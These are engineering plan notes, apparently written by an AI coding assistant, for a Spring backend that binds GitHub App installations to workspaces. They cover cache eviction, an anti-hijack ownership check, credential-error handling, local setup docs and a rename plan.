`SCAN` is incremental and non-blocking. It may miss a key added mid-scan, which is harmless here: a missed eviction costs one stale-but-valid token for at most the remaining TTL, and the token is already narrowly scoped.

**Also derive the TTL from GitHub's response.** `TokenResponse.expires_at` (`InstallationTokenService.java:54`) is parsed and never read, while `CACHE_TTL` hardcodes 50 minutes next to a comment asserting GitHub tokens last 60. Two sources of truth for one fact, one of them an assumption. Cache until `expires_at` minus ten minutes' headroom, floored so a surprise short-lived token cannot produce a negative TTL. Flagged separately because it is a behaviour change, not just a rename — veto it and keep the constant if you would rather not couple to the response.

### Test — `src/test/java/dev/tushar/forge/githubinstallation/InstallationTokenServiceTest.java`

Extends `support/AbstractIntegrationTest.java`, which already provides the singleton Redis container. **No GitHub stub needed** — seed the cache directly and exercise only eviction, so the test has no network dependency:

```
seed  forge:ghtok:111:aaa, forge:ghtok:111:bbb, forge:ghtok:222:ccc
evict(111)
assert 111's keys are gone and 222's survives
```

That is the assertion the current implementation fails, which is the point of writing it. The bean autowires cleanly with unconfigured properties — `GithubAppJwtServiceTest:89` already relies on `GithubAppProperties(null, …)` constructing — so the token-minting path never has to be reached.

### Commits — four, in this order

| # | Scope |
|---|---|
| 1 | `refactor(api): /api/session replaces /api/me` |
| 2 | `test(arch): assert nothing depends on the api module` |
| 3 | `refactor: githubauth→githublogin, githubapp→githubinstallation` (19 files; stands alone so the rename is reviewable as a rename) |
| 4 | `fix(githubinstallation): scope token-cache eviction to one installation` |

### Verification

- `./gradlew test` — expect **45** tests, all green.
- The new test must be seen to fail before the fix: run it against the current `evictAll` first and confirm the `222` key is wrongly deleted.
- `grep -rn "\.keys(" src` returns nothing — `KEYS` is gone from the codebase.
- `ModularityTest.printModuleStructure` still shows `githubinstallation` exposing only `InstallationTokenService` and `TokenScope`.

### Housekeeping, unrelated to the code

- **The task list has drifted:** #12 is titled "Add /api/me endpoint" (renamed), #17 "Reorganise modules" is complete but still `in_progress`, and #14 is `in_progress` though the JWT and token-minting work it describes is done — only the installation flow (#15) remains.
- **`/tmp/mjar`** is leftover scratch from inspecting the Modulith jar to find `getIdentifier()`. Outside the repo, but mine to clean up.

### Still open, deliberately

- Installation tokens are cached in Redis **in plain text**, pending `platform.crypto`. Documented in the class javadoc; unchanged by this fix.
- `SessionController` and the token-minting path have no tests. `TokenScope.fingerprint()` is well covered (`TokenScopeTest`, 7 cases) but nothing verifies it end-to-end through the service.
- `IamQueries` naming, the inconsistent `Forge` prefix, and sub-packaging `api/` by resource — all deferred as agreed.

---

# Task #15 — Installation binding with anti-hijack verification

## Context

Phase 1.6 can currently mint a scoped installation token but has no way to *acquire* an installation: nothing writes `github_installations`. This task closes the loop — a logged-in user installs the GitHub App, GitHub redirects back, and Forge binds that installation to their workspace only after proving they are entitled to it.

The attack this exists to stop (§7): installation ids are smallish integers that leak into logs and URLs. Without verification, anyone who learns one can hit the setup callback and bind a stranger's installation into their own workspace, gaining agent access to repositories they do not own. **The state nonce does not prevent this** — an attacker can generate a perfectly valid nonce bound to their own session and then substitute a victim's `installation_id`. The nonce stops CSRF; only an ownership check stops id substitution.

### A contradiction in §7, resolved

§7 asks us to "verify the current user is an admin/owner of that installation's account" while also refusing the `Members` and `Organization` App permissions. **Those are incompatible.** GitHub App user-to-server tokens carry no OAuth scopes — their reach is defined by the App's own permissions — so neither `GET /user/memberships/orgs/{org}` nor `read:org` is available to us.

Decision: **personal-account installations only in this task.** `account_type == "User"` is verifiable exactly, with no extra permission and no stored token, by comparing the installation's `account.id` against the GitHub numeric id already in `user_identities.provider_user_id`. `Organization` installs are **rejected and audited**, not silently accepted. Org support becomes its own task where the access-vs-admin tradeoff gets decided in the open rather than buried in an implementation.

This is a real product limitation, not a nicety — most design partners will want org repos — so the rejection message must say so plainly rather than reading like a bug.

## Prerequisite discovered while reading: sessions have no workspace

`Session.selectWorkspace()` (`iam/internal/session/Session.java:85`) has **zero callers**. `SessionService.issue()` never sets a workspace, so `sessions.workspace_id` is always NULL and `ForgePrincipal.activeWorkspaceId` has been null since it was written — `/api/session` has been returning null for it all along.

Binding needs a target workspace, and `TenantScope.runInTenant(null, …)` throws `MissingTenantContextException`. So this is a blocker, not a nice-to-have.

**Fix in `iam/SessionService.java`:** resolve the user's default workspace at issue time and call `selectWorkspace`. Keep the public signature `issue(userId, userAgent)` unchanged — the caller in `githublogin/internal/SecurityConfig.java:87` should not learn about workspace resolution. `SessionService` gains `WorkspaceRepository` (already module-internal, `findAllForUser` exists and is ordered). Every user has exactly one workspace today because `UserProvisioningService.createNew` makes a personal one; pick deterministically anyway (OWNER first, then first by name) so multi-workspace users do not get an arbitrary one later.

## Design

### Flow

```
GET /api/installations/start           (authenticated)
  → mint nonce, store in Redis bound to this session, 15 min, single-use
  → 302 to https://github.com/apps/{slug}/installations/new?state={nonce}

  … user picks account + repositories on GitHub …

GET /api/installations/callback?installation_id=&setup_action=&state=
  1. consume nonce (GETDEL) — must exist, and map to THIS session id
  2. GET /app/installations/{id} with the App JWT
       — authoritative; the query parameter is an assertion, not evidence
  3. account_type must be "User"        → else 409 + audit, org not yet supported
  4. account.id must equal the caller's user_identities.provider_user_id
                                        → else 403 + audit  ← the anti-hijack check
  5. insert github_installations        → unique(installation_id) rejects rebinding
  6. audit INSTALLATION_BOUND, redirect
```

Step 2 is the one that must not be skipped for convenience: everything after it reasons about GitHub's answer, never the caller's parameter.

### Files

| File | Role |
|---|---|
| `api/installation/InstallationController.java` | **new** — `start` + `callback`, no business logic |
| `api/session/SessionController.java` | **moved** — `api/` now has two resources, so the by-resource split agreed earlier lands here |
| `githubinstallation/InstallationBindingService.java` | **new**, public — the verification chain above |
| `githubinstallation/InstallationBinding.java` | **new**, public record — the bound result as other modules see it |
| `githubinstallation/internal/GithubAppClient.java` | **new** — owns the `RestClient`, exposes `fetchInstallation(long)` and the token mint |
| `githubinstallation/internal/InstallationSetupNonces.java` | **new** — Redis nonce issue/consume |
| `githubinstallation/internal/GithubInstallation{,Repository}.java` | **new** — JPA entity + Spring Data repository |
| `githubinstallation/InstallationTokenService.java` | delegate HTTP to `GithubAppClient`, keep the caching |
| `iam/IamQueries.java` | **+** `Optional<String> githubUserId(UUID userId)` |
| `iam/SessionService.java` | select default workspace at issue time |
| `audit/AuditLog.java` | **new**, minimal — first real auditable action needs somewhere to go |

**Reuse rather than rebuild:** `TenantScope.runInTenant` for every write (RLS `WITH CHECK` rejects inserts otherwise — this already bit us once when seeding audit rows); `GithubAppJwtService.mintAppJwt()` for step 2; `TokenScope.readOnly/contribute` unchanged; `AbstractIntegrationTest` for the Postgres + Redis containers.

**Extract the `RestClient`.** `InstallationTokenService` currently builds its own with `apiBaseUrl`, `Accept` and `X-GitHub-Api-Version` headers. The new call needs the identical setup, and two copies is how one of them silently misses a version bump. `GithubAppClient` owns transport; `InstallationTokenService` keeps caching. That split is worth having on its own.

**Package layout:** keep `githubinstallation/internal` flat at ~6 files. When #16 adds repository and managed-repository entities it reaches ~10, which is when the by-aggregate split (`installation/`, `repository/`) earns itself. Structure when there is content to justify it.

### Notes that will otherwise cost an hour each

- **`ddl-auto: validate` is strict** — the `citext` incident is precedent. `permissions` and `events` are `jsonb`; map with `@JdbcTypeCode(SqlTypes.JSON)`. If validation objects, map them as `String` rather than weakening validation.
- **The callback sits under `/api/**`**, so `SecurityConfig` already requires authentication. A session that expires mid-install yields a bare 401 rather than a login redirect. Acceptable for alpha; note it, do not fix it here.
- **`setup_action`** is `install` or `update`; treat `update` as a no-op re-sync rather than an error.
- New config: `forge.github.app.setup-redirect` (default `/`) for where to send the browser afterwards. `slug` already exists and builds the install URL.

## Verification

- `./gradlew test` — expect **~53** tests green.
- **The anti-hijack test is the point of the task.** Bind installation `A` owned by GitHub user `1`; then, as a user whose `provider_user_id` is `2`, replay the callback with `A`'s id and a nonce legitimately minted for user 2's own session. Must be rejected with an audit row, and `github_installations` must be unchanged. A test that only exercises the happy path proves nothing here.
- Nonce: reuse rejected (single-use), foreign session rejected, absent rejected.
- Organization `account_type` rejected with the "not yet supported" path, not a stack trace.
- Rebinding an already-bound `installation_id` to a second workspace fails at the **database** unique constraint, not only in application code — assert the constraint violation specifically, since that is the guarantee §7 relies on.
- `/api/session` now returns a non-null `activeWorkspaceId` — the regression test for the prerequisite fix.
- `ModularityTest.moduleNamesAreDeliberate` still passes; `api.installation` is a sub-package, not a new module.

## Out of scope — Task #16

Repository sync (`GET /installation/repositories`) and `ManagedRepository` opt-in. Deliberately separate: the verification chain is the security-critical piece and deserves to be reviewable without a repo-sync loop diluting the diff.

---

# Addendum — closing gap §1.1, and the local-setup facts needed before real credentials

## Context

Tasks #15 and #16 are done (66 tests green) and `docs/known-gaps.md` records what was deferred. The next step is the first run against a real GitHub App, and two things block it.

**The blocker in the code (§1.1).** `GithubAppClient.fetchInstallation` swallows every 4xx and returns `Optional.empty()`. That is correct for 404 — the binding flow must not tell a caller whether an installation id exists — but it treats **401 identically**. A 401 means GitHub is rejecting *Forge's own App credentials*: wrong `app-id`, a revoked key, a well-formed key belonging to a different App, or clock skew. Today that presents to every user as `403 NOT_YOUR_ACCOUNT` / `UNKNOWN_INSTALLATION`, with nothing in the logs pointing at the real cause. It is the most likely first-run failure and the hardest one to diagnose.

Worth being precise about the scope: a *malformed* key already fails loudly — `GithubAppJwtService.parsePrivateKey` detects PKCS#1 and throws with the exact `openssl` command. The silent case is specifically a key that parses fine and GitHub refuses. The other three GitHub calls (`listRepositories`, `mintDiscoveryToken`, `mintInstallationToken`) register no `onStatus` handler, so `RestClient` already throws on 4xx there. `fetchInstallation` is the only silent path.

**The blocker outside the code.** No frontend exists yet (`/home/user/Self/Forge/forge-frontend` is an empty directory), so the App and OAuth App must be configured entirely against the backend on `localhost:8080`. Which of GitHub's URL fields are load-bearing versus cosmetic is not written down anywhere, and getting the callback URLs wrong is a silent-ish failure too.

A second, newly found trap that will bite the manual test on step one is recorded in §4 below.

## 1. Fix §1.1 — `githubinstallation/internal/app/GithubAppClient.java`

Add an SLF4J logger (matching the four already in the module) and replace the empty `onStatus` handler at line 78 with a status-aware one.

**401 throws; everything else still returns empty.** A 401 is not a fact about the requested installation — it is a fact about Forge's configuration, identical for every id — so surfacing it leaks nothing and is not an oracle. Letting it fall through to the rejection path is what makes a misconfigured Forge tell every user their installation is not theirs.

```java
public Optional<InstallationView> fetchInstallation(long installationId) {
    InstallationView view = restClient
            .get()
            .uri("/app/installations/{id}", installationId)
            .header("Authorization", "Bearer " + appJwt.mintAppJwt())
            .retrieve()
            .onStatus(HttpStatusCode::is4xxClientError, (request, response) ->
                    handleLookupFailure(installationId, response.getStatusCode()))
            .body(InstallationView.class);

    return Optional.ofNullable(view);
}

/**
 * What a 4xx on an installation lookup means, and who it is about.
 *
 * <p>Only 404 is routine. Collapsing the rest into it is what turned a wrong App key into
 * "that installation is not yours" — a message about the caller, for a fault that is ours.
 */
private void handleLookupFailure(long installationId, HttpStatusCode status) {
    if (status.value() == HttpStatus.UNAUTHORIZED.value()) {
        // Not about this installation: GitHub is refusing the App credentials themselves, so
        // no binding by any user can succeed. Thrown rather than returned, because it is a
        // server fault and the caller-facing rejection path would bury it.
        throw new IllegalStateException("GitHub rejected the Forge App credentials (401). Check "
                + "forge.github.app.app-id and the private key — a well-formed key belonging to a "
                + "different App fails exactly here.");
    }
    if (status.value() == HttpStatus.NOT_FOUND.value()) {
        // The ordinary answer for a guessed id. Callers must not be able to tell this from 403,
        // so only the server-side record distinguishes them.
        log.debug("GitHub does not know installation {}", installationId);
        return;
    }
    // Usually a suspended App or an exhausted rate limit. Both are operator concerns and both
    // were invisible while this was folded in with 404.
    log.warn("Installation lookup for {} refused with {}", installationId, status.value());
}
```

Nothing else changes. `InstallationBindingService` catches `RuntimeException` only around `repositorySync.sync()` and `DataIntegrityViolationException` only around persist, so the throw propagates to Spring's default handler as a 500 with no controller change needed.

One consequence to accept, not fix: the nonce is consumed before `fetchInstallation` runs, so a 401 spends it and the user must restart the install flow. Single-use is the security property; weakening it to be tidy on a path that should never happen is the wrong trade.

## 2. Test support — `src/test/java/dev/tushar/forge/support/FakeGithub.java`

Add a registry of installation ids that answer 401, so the case is exercised without a global toggle that could bleed across tests sharing the static server:

```java
private static final Set<Long> UNAUTHORIZED = ConcurrentHashMap.newKeySet();

/** An installation id GitHub answers with 401 — the shape of a rejected App key. */
public static long unauthorized() {
    long id = NEXT_ID.incrementAndGet();
    UNAUTHORIZED.add(id);
    return id;
}
```

In `handleInstallations`, check `UNAUTHORIZED` in the non-token branch only (the `/access_tokens` branch returns early above it) and `respond(exchange, 401, "")`.

## 3. Test — `InstallationBindingServiceTest`

One test, beside the existing `unknownInstallationIsRejected` which already pins the 404 behaviour and must stay green:

```java
@Test
@DisplayName("GitHub rejecting Forge's own credentials is a server fault, not a user rejection")
void badAppCredentialsFailLoudly() {
    long installationId = FakeGithub.unauthorized();
    String nonce = bindings.beginSetup(sessionId);

    assertThatThrownBy(() -> bindings.completeSetup(installationId, nonce, sessionId, userId, workspaceId))
            .isInstanceOf(IllegalStateException.class)
            .hasMessageContaining("401");
}
```

Per the standard used for the anti-hijack and discovery-never-implies-consent guarantees: run this against the current implementation first and watch it fail (it returns `Rejected(UNKNOWN_INSTALLATION)` rather than throwing) before the fix lands.

## 4. Newly found gap — `cookie-secure` defaults to `true`

`SecurityConfig.java:24` defaults `forge.security.cookie-secure` to `true`, and `ForgeSessionCookie.write` sets `Secure` from it. Over plain `http://localhost:8080`, **`curl` will not send a `Secure` cookie back**, so every authenticated step of the §7 manual checklist fails with a bare 401 that looks like broken auth. Browsers are more forgiving (Chrome and Firefox permit `Secure` on `localhost`), which makes this worse — it will work in the browser and fail in `curl`, in the same session.

**No yaml change.** Defaulting to insecure so local testing is convenient is exactly how it ships that way. Run the app with the override instead, and record it in the setup doc:

```
SPRING_APPLICATION_JSON='{"forge":{"security":{"cookie-secure":false}}}' ./gradlew bootRun
```

## 5. New file — `docs/local-setup.md`

Answers the question this addendum started from. **The rule: a URL GitHub *redirects the browser to* must be the backend; a URL GitHub merely *displays* is cosmetic.** Homepage URL is in the second category — it appears on the consent screen and the App's public page and never participates in either flow.

**OAuth App** (identifies humans — `read:user`, `user:email`):

| Field | Value | Load-bearing? |
|---|---|---|
| Homepage URL | `http://localhost:8080` | No — cosmetic. Becomes the frontend URL when one exists |
| Authorization callback URL | `http://localhost:8080/login/oauth2/code/github` | **Yes** — Spring Security owns this path |

**GitHub App** (grants the agent authority):

| Field | Value | Load-bearing? |
|---|---|---|
| Homepage URL | `http://localhost:8080` | No — cosmetic |
| Setup URL | `http://localhost:8080/api/installations/callback` | **Yes** — `InstallationController.callback` |
| Redirect on update | ticked | Yes — makes `setup_action=update` come back through the same check |
| Webhook | **Active unchecked** | Not built until Phase 6 |
| Install scope | Only on this account | Org installs are refused by design (§4.1) |

Permissions: Metadata read; Contents, Pull requests, Issues read+write; Checks, Commit statuses, Actions read. **Not Workflows** — that omission is what prevents the agent editing the CI config that grades its own work.

Environment (never in `application.yaml` — the App private key can act as the App on every account it is installed on):

```bash
export GITHUB_OAUTH_CLIENT_ID=...
export GITHUB_OAUTH_CLIENT_SECRET=...
export FORGE_GITHUB_APP_APP_ID=...
export FORGE_GITHUB_APP_SLUG=...
export FORGE_GITHUB_APP_PRIVATE_KEY_PEM="$(cat github-app.pkcs8.pem)"
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt \
  -in github-app.private-key.pem -out github-app.pkcs8.pem   # JDK cannot read GitHub's PKCS#1
```

Confirm `*.pem` is gitignored before the key lands in the working tree. Verify the exact `FORGE_GITHUB_APP_*` names against `GithubAppProperties` binding while writing this file rather than trusting the list above.

Also document where the user lands *after* each flow — `forge.security.login-success-redirect` and `forge.github.app.setup-redirect`, both currently `/`. These are Forge's own config, not GitHub's, and are the two knobs that will point at the frontend later. Leaving them at `/` now is deliberate: there is no dev server port to guess at, and no CORS bean is needed while everything is same-origin on 8080.

## 6. Update `docs/known-gaps.md`

- §1.1 — rewrite as fixed: 401 now throws with a diagnostic message, 403/404 remain indistinguishable to the caller and are logged apart server-side.
- §1 — add the `cookie-secure` trap from §4 above, with the override command.
- §5 — the "no real-GitHub smoke test" row stands; add that `FakeGithub` now covers 401.
- §7 — add a checklist item: run once with a deliberately wrong `FORGE_GITHUB_APP_APP_ID` and confirm a 500 plus the credentials message, rather than a 403.
- Fix the stray `**` at the start of line 1 and end of the last line — leftover bold markers that break rendering.

## Verification

- `./gradlew test` — expect **67**, up from 66, all green.
- Watch `badAppCredentialsFailLoudly` fail against the unfixed client before applying the fix; a test for a diagnostic path that was never seen failing proves nothing.
- `unknownInstallationIsRejected` must still return `Rejected(UNKNOWN_INSTALLATION)` — the 404 contract is unchanged, and this is the regression guard for it.
- `ModularityTest` and `AbstractionHygieneTest` unaffected; no new type, no new module, no interface.
- Manual, once credentials exist: start the app with a correct App id, complete an install, confirm binding; then restart with `FORGE_GITHUB_APP_APP_ID` set to a wrong number and confirm the callback returns 500 and the log names the credentials — not `403`.

## Housekeeping

Task list has drifted: #15 and #16 are both committed but still show `pending`.

---

# Follow-up — `local-setup.md` conflates "required" with "load-bearing"

**Status: implemented.** Superseded in part by the next section, which corrects a field name this
one left untouched.

## Context

`docs/local-setup.md` was written this session and immediately misled the person it was written for.
It labels Homepage URL **"cosmetic"** and says "anything resolvable is fine", so on hitting GitHub's
required-field asterisk the reasonable conclusion was that the doc must be wrong.

Both claims are sloppy in opposite directions:

- Homepage URL **is required** on both the OAuth App and GitHub App forms. "Cosmetic" answered *does
  Forge read this* when the reader was asking *must I fill this in*.
- "Anything resolvable" overstates it — GitHub validates that the value parses as a URL and never
  fetches it. Resolvability is not checked at all.

The distinction the doc needs, and currently collapses into one column:

> **Required** — the form will not submit without it.
> **Load-bearing** — GitHub redirects a browser here, so a wrong value breaks the flow.

Homepage URL is required on both forms and load-bearing on neither. Only the OAuth callback URL and
the App's Setup URL are load-bearing.

## Change — `docs/local-setup.md` only

1. **Rewrite the "The rule for every URL field" section** to lead with required-vs-load-bearing
   rather than redirects-vs-displays. Keep the redirect rule as the *test* for load-bearing, since
   that is the useful heuristic. State plainly that Homepage URL is required, displayed only, never
   fetched, and need not resolve. Offer `http://localhost:8080` or the repository URL, noting the
   latter is the more honest value for a field whose only job is to be displayed.

2. **Retitle the third column of both tables** from `Load-bearing?` to `What it does`, and replace
   the `**No** — cosmetic` entries:

   | Field | Value | What it does |
   |---|---|---|
   | Homepage URL | `http://localhost:8080` | Nothing — required by the form, displayed only |
   | Authorization callback URL | `…/login/oauth2/code/github` | **Load-bearing** — Spring Security owns this path |

   Same treatment for the GitHub App table's Homepage URL and Setup URL rows.

3. **Sharpen the opening paragraph.** "asks for five URLs and only three of them do anything" has
   the right instinct but reads as a grumble. Make it the thesis: most of these fields are required
   and inert, and knowing which two are not is the entire point of the document.

No code, no tests, no other file. The `known-gaps.md` cross-link added earlier stays valid.

## Verification

Not a testable change; the check is a reading one. Someone filling in both GitHub forms with only
this document open should never have to guess whether a required field matters — the Homepage URL
row must answer both "what do I type" and "does it matter" without the reader inferring either.
`./gradlew test` should still report **67**; nothing under `src/` is touched.

---

# Follow-up 2 — `local-setup.md` names a field GitHub has renamed, and omits two traps

**Status: implemented.**

## Context

Walking the forms against the doc turned up one error and three omissions. The error is the
expensive one: the doc calls the OAuth App's critical field **"Authorization callback URL"**, which
is what GitHub used to call it. The form now says **"Redirect URIs"** — plural, a repeatable list of
up to 10, with the single entry's label rendered as "Redirect URI". A reader scanning for the old
name does not find it, and the one genuinely load-bearing field on that form is the one they end up
guessing at.

Verified while checking: `application.yaml` sets no `redirect-uri`, so Spring Security uses the
default template `{baseUrl}/login/oauth2/code/{registrationId}` with `registrationId: github` —
`http://localhost:8080/login/oauth2/code/github`, no trailing slash.

The three omissions are all fields the doc says nothing about, two of which look like they need
filling in and must not be:

- The **GitHub App's own Redirect URI** and **"Request user authorization (OAuth) during
  installation"**. Both must stay blank/unchecked — Forge identifies humans through the separate
  OAuth App. The Redirect URI field in particular sits on the App form looking exactly like the one
  that *is* required on the OAuth form. Enabling the OAuth-during-installation checkbox is Option 1
  from the deferred org-support decision (§4.1) and would change the install flow.
- **Allow wildcard matching** on the OAuth redirect. Must stay off: a wildcard redirect means any
  matching subdomain or path can receive the authorization code.
- **Generating the private key.** The doc explains converting PKCS#1 → PKCS#8 but never says where
  the key comes from. It is at the bottom of the App's General page, and it is easy to finish the
  form believing setup is complete without one.

## Change — `docs/local-setup.md` only

1. **OAuth App table** — rename the row to `Redirect URI`, noting GitHub previously called this
   "Authorization callback URL" so anyone following an older guide can reconcile the two. Add rows
   for `Allow wildcard matching` (off, with the reason) and `Expire user access tokens` (irrelevant
   — Forge discards the user token after the profile fetch and never stores it, per §6).

2. **GitHub App table** — add the two leave-them-alone rows, `Redirect URI` (blank) and `Request
   user authorization (OAuth) during installation` (unchecked), each saying *why* rather than just
   what, since "blank" without a reason invites someone to helpfully fill it in later.

3. **New step: generate the private key.** Fold into the existing private-key section — where the
   button is, that it downloads PKCS#1, then the existing `openssl` conversion.

4. **New step: find your slug.** `FORGE_GITHUB_APP_SLUG` is currently described as "URL slug, e.g.
   forge-tushar" with no way to obtain it. Say to read it off the App's public page URL
   (`https://github.com/apps/<slug>`), and why it matters: `InstallationController.start` builds the
   install URL from it, so a wrong slug is a 404 at the moment the user clicks Connect.

5. **Note the unused credentials.** A GitHub App also issues a Client ID and client secret. Forge
   uses neither — App auth is private key → JWT — and saying so prevents someone wiring the client
   secret in somewhere on the assumption it must be needed.

No code, no tests, no other file.

## Verification

Reading check again, but a sharper one than last time: every field visible on either registration
form should appear in the doc, including the ones whose correct value is "leave it alone". The
specific regression to avoid is a field name that no longer matches GitHub's UI, so the OAuth row
must carry both the current name and the old one. `./gradlew test` still reports **67**; nothing
under `src/` is touched.

---

# Task A — make local configuration actually load, and finish GitHub setup

## Context

Setup stalled on two things a doc could not fix by describing harder.

**`.env` is inert.** A `.env` was created at the repo root holding four variables, and nothing reads
it. Spring Boot has no native `.env` support, and there is no dotenv dependency in `build.gradle`,
nothing in `docker-compose.yml`, and nothing in the app. `local-setup.md` says `export FORGE_…`
without ever saying how those exports are meant to happen, so reaching for a `.env` was the obvious
move and it silently does nothing.

**The private key had not been generated.** GitHub creates none when the App is created; it is a
button on the General page under a *Private keys* heading, below the Webhook section. "I can't see
any private key" was accurate — there was nothing to see. The doc says how to *convert* the key but
originally never said where it comes from (partly fixed in Follow-up 2; the remaining gap is that a
reader still has to scroll past what looks like the end of the form).

Current `.env` versus what Forge reads:

| Variable | Verdict |
|---|---|
| `GITHUB_OAUTH_CLIENT_ID` / `_SECRET` | correct — literal placeholders in `application.yaml` |
| `GITHUB_APP_CLIENT_ID` / `_SECRET` | **unused** — App auth is private key → JWT, never the client secret. Remove |
| `FORGE_GITHUB_APP_APP_ID` | missing — `4602643` |
| `FORGE_GITHUB_APP_SLUG` | missing — read from `https://github.com/apps/<slug>` |
| `FORGE_GITHUB_APP_PRIVATE_KEY_PEM` | missing — key not generated yet |

Boot-time behaviour is acceptable and needs no code change: `GithubAppJwtService:49-52` throws
`"GitHub App is not configured: set forge.github.app.app-id and forge.github.app.private-key-pem"`
on first use. Legible, actionable, already tested. No startup validator required.

## Change

**1. `scripts/dev.sh`** — new, executable. The three things that must happen together and are easy
to get wrong individually:

```bash
#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")/.."

[ -f .env ] || { echo "No .env — see docs/local-setup.md"; exit 1; }
set -a; . ./.env; set +a          # -a exports everything the file defines

# Secure cookies are withheld by curl over plain HTTP; see known-gaps.md §1.2.
# Overridden here rather than weakened in application.yaml.
exec ./gradlew bootRun --args='--forge.security.cookie-secure=false'
```

Sourcing rather than parsing is deliberate: it makes `FORGE_GITHUB_APP_PRIVATE_KEY_PEM="$(cat
github-app.pkcs8.pem)"` work inside `.env`, so the key stays in its own gitignored file instead of
being pasted as one long line into a second one.

Use `--args` rather than `SPRING_APPLICATION_JSON` — same effect, far more readable, and it shows up
in the process list where someone debugging can see it.

**2. `.env.example`** — new, committed. Names only, no values, with the App-client trap called out:

```bash
GITHUB_OAUTH_CLIENT_ID=
GITHUB_OAUTH_CLIENT_SECRET=
FORGE_GITHUB_APP_APP_ID=
FORGE_GITHUB_APP_SLUG=
FORGE_GITHUB_APP_PRIVATE_KEY_PEM="$(cat github-app.pkcs8.pem)"
# Not needed: a GitHub App also issues a Client ID and secret. Forge uses neither.
```

Confirm `.gitignore` already covers `.env` and `.env.*` but **not** `.env.example` — the current
pattern `.env.*` would swallow it, so add a `!.env.example` negation.

**3. `docs/local-setup.md`** — add a "Running it" rewrite: `cp .env.example .env`, fill it, run
`./scripts/dev.sh`. State plainly that Spring Boot does not read `.env` and that the script is what
loads it, so nobody later removes the script assuming the framework handles it. Fold the existing
`cookie-secure` paragraph into the script's rationale rather than repeating the raw command.
Sharpen the private-key step: GitHub generates none, keep scrolling past the Webhook section.

## Verification

- `./scripts/dev.sh` with an incomplete `.env` reaches the `GithubAppJwtService` message above
  rather than failing obscurely.
- With it complete, the app boots and `GET /api/session` over `curl` returns a session — this is the
  end-to-end proof that both the env loading and the cookie override work, and the first item on the
  `known-gaps.md` §7 checklist.
- `git status` shows `.env.example` tracked and `.env` untracked.
- `./gradlew test` still **67**; nothing under `src/` changes.

---

# Task B — rename Forge → ForgeStack (deferred until Task A is verified)

## Context

The registered apps are "ForgeStack OAuth" and "ForgeStack App"; the codebase says Forge
throughout. Decision taken: **ForgeStack is the product name and the codebase follows.**

**Sequencing: do this after Task A proves the GitHub flow works end to end.** The rename changes
`FORGE_GITHUB_APP_*` to `FORGESTACK_GITHUB_APP_*`, so doing it first means writing `.env` twice —
but that is the small reason. The real one is that renaming 82 files before the credentials have
ever succeeded means a first failure is ambiguous between "the rename broke it" and "the credentials
are wrong". Verify against a known-good baseline, then rename. Cost of deferring: three variable
names.

## Blast radius (surveyed, not estimated)

| Surface | Extent |
|---|---|
| Package root `dev.tushar.forge` | 82 files |
| Class names | `ForgeApplication`, `ForgeApplicationTests`, `ForgeOAuth2UserService`, `ForgePrincipal`, `ForgeSessionAuthenticationFilter`, `ForgeSessionCookie` |
| Config prefix `forge.*` | `forge.role`, `forge.github.app.*`, `forge.security.*` — and every matching env var |
| Database | `jdbc:…/forge`, roles `forge_app` / `forge_migrator`, Hikari `forge-pool` |
| Redis prefixes | `forge:ghtok:`, `forge:ghsetup:` |
| Docs | `local-setup.md`, `known-gaps.md`, plus this plan |

## Open decisions to settle when Task B starts

Not settled now, because each has a real cost and none blocks Task A:

1. **Does the database rename too?** `forge` → `forgestack` plus both roles means recreating the
   local database and editing `docker-compose.yml`. Purely cosmetic; the alternative is a permanent
   small inconsistency between product name and DB name, which is extremely common and harmless.
2. **Does the config prefix become `forgestack.*`?** Consistent, but every property key and env var
   gets four characters longer for no functional gain.
3. **Do the `Forge*` classes become `ForgeStack*`?** `ForgeStackSessionAuthenticationFilter` is a
   mouthful. The prefix exists only where it disambiguates from a framework type
   (`ForgePrincipal` vs `java.security.Principal`), so a short internal prefix is defensible.

Redis prefixes are safe to change whenever — the cache is derived state and losing it costs nothing.

## Verification

`./gradlew test` at **67** before and after, with `ModularityTest.moduleNamesAreDeliberate` updated
to the new package root. The rename is correct only if the test count and the module inventory are
identical on both sides; any change in either means something was renamed that should not have been.

---

# Task C — first real installation, and the §7 checklist

**Status: BLOCKED by Task D.** The first browser login succeeded and then every `/api/**` call
returned HTTP 500. Task D fixes that; the checklist below resumes unchanged afterwards.

## Context

Tasks A and B are done: the app boots, `.env` loads via `scripts/dev.sh`, and the rename landed at
67 tests green. Phase 1.6 has been *written* and unit-tested against `FakeGithub`, but **no line of
it has ever run against real GitHub**. Everything below exists to change that.

Two blockers were reported last session. One is now cleared, verified against the live API by
minting an App JWT from `forgestack-app.pkcs8.pem` and calling `GET /app`:

| Check | Before | Now |
|---|---|---|
| App permissions | `{}` | `actions:read, checks:read, contents:write, issues:write, metadata:read, pull_requests:write, statuses:read` — the seven from §7, **no `workflows`** |
| `installations_count` | 0 | **0 — still the blocker** |

The permission set is exactly right and needs no further edit. What remains is a browser action
plus the verification pass it unlocks.

## The one thing that will silently break the install

The App must be installed **through ForgeStack**, not from GitHub's own app page.

`InstallationBindingService.completeSetup:90-93` consumes a single-use nonce bound to the caller's
session, and a missing `state` fails closed with `INVALID_SETUP_STATE` → 400
(`InstallationController.statusFor:94`). Installing from `https://github.com/apps/forgestack-app`
directly produces a callback with no `state`, so GitHub records the installation and ForgeStack
records nothing — an inconsistency with no error message pointing at the cause.

The correct entry point is `GET /api/installations/start`
(`InstallationController.start:46-55`), which mints the nonce and builds the install URL from
`FORGESTACK_GITHUB_APP_SLUG` (`forgestack-app`, confirmed against the live API).

**Unverifiable remotely:** `GET /app` does not expose the App's Setup URL, so the one field that
cannot be checked from here is whether it reads
`http://localhost:8080/api/installations/callback`. If it is blank, GitHub never redirects back and
the binding never happens. Eyeball it on the App's General page before installing.

## Sequence

Steps 1–2 need a browser and are the user's; everything after is drivable from `curl` given the
session cookie.

1. Log in: `http://localhost:8080/oauth2/authorization/github`. Confirm the consent screen requests
   only `read:user` and `user:email` — the `GithubOAuthScopeTest` property, checked against the real
   screen for the first time.
2. Visit `http://localhost:8080/api/installations/start` in the same browser. Pick **QL-Tushar-Kumar**
   and a small number of repositories.
3. Export the session cookie and walk the `known-gaps.md` §7 checklist below.

## Checklist, and what each item actually proves

Ordered so the destructive items come last.

| # | Item | Proves |
|---|---|---|
| 1 | `GET /api/session` returns non-null `activeWorkspaceId` | The Task #15 prerequisite fix — `Session.selectWorkspace` had zero callers and this was null since it was written |
| 2 | Callback bound and redirected | The whole verification chain, first real run |
